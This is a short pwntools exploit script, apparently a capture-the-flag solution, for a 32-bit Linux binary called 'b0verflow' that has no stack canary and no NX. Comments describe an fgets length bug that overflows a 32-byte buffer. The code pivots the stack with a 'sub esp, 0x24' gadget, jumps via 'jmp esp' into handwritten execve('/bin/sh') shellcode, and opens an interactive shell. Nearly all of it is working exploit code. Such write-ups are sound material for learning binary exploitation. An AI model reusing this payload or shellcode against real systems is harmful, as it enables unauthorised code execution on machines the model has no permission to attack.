from pwn import *

'''
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments

    (Who needs mitigations anyways?)

    vulnerable code:

    int vul(void) {
      char local_24 [32];
         ... 
      // Note how fgets reads HEX 32 bytes into a DEC 32 buffer
      fgets(local_24,0x32,stdin);
         ... 
    }

    exploit strategy:
        - Create more stack space by pivoting
        - jmp esp --> execute shell code which is already present on the stack
'''

context.update(arch='i386', os='linux')
e = context.binary = ELF("./b0verflow")

if args.GDB:
    p = gdb.debug(e.path,
    # b @leave
    '''
    b * 0x0804859f
    continue
    ''')
else:
    p = process(e.path)
libc = e.libc

sub_sp_0x24 = p32(next(e.search(asm("sub esp, 0x24; ret;"))))
jmp_esp     = p32(next(e.search(asm("jmp esp;"))))

# Shellcraft is too large, so we need to use a locally sourced, organic shellcode:
shellcode = asm('''
   push 0x0068732f;
   push 0x6e69622f;
   mov ebx, esp;
   xor ecx, ecx;
   mov edx, ecx;
   mov eax, 0xb;
   int 0x80;
''')


log.info(f"Shellcode size: {len(shellcode)}")


offset = 36
payload  = b"A" * 4
payload += jmp_esp
payload += shellcode

padding  = offset - len(payload)
assert padding >= 0

payload += b"B" * padding
payload += sub_sp_0x24


p.sendlineafter("What's your name?", payload)
p.interactive()

